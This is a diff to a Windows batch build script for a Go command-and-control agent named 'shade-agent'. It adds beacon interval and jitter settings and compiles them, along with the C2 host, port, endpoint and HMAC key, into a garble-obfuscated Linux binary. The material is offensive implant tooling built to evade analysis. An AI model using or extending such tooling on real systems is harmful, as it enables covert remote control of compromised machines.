@@ -23,12 +23,20 @@ if "%HMAC_KEY%"=="" (
     exit /b 1
 )
 
+set /p BEACON_INTERVAL="Beacon Interval (seconds) [15]: "
+if "%BEACON_INTERVAL%"=="" set BEACON_INTERVAL=15
+
+set /p JITTER="Jitter (seconds) [10]: "
+if "%JITTER%"=="" set JITTER=10
+
 echo.
 echo Configuration:
-echo   Host:     %C2_HOST%
-echo   Port:     %C2_PORT% (SSH)
-echo   Endpoint: %C2_ENDPOINT%
-echo   HMAC Key: %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
+echo   Host:            %C2_HOST%
+echo   Port:            %C2_PORT% (SSH)
+echo   Endpoint:        %C2_ENDPOINT%
+echo   HMAC Key:        %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
+echo   Beacon Interval: %BEACON_INTERVAL%s
+echo   Jitter:          %JITTER%s
 echo.
 
 REM Check if garble is installed
@@ -48,7 +56,7 @@ echo [*] Building with garble obfuscation...
 REM Build with garble for Linux
 set GOOS=linux
 set GOARCH=amd64
-garble -literals -tiny build -ldflags "-s -w -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY%" -o shade-agent main.go
+garble -literals -tiny build -ldflags "-s -w -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o shade-agent main.go
 
 if %ERRORLEVEL% EQU 0 (
     echo.
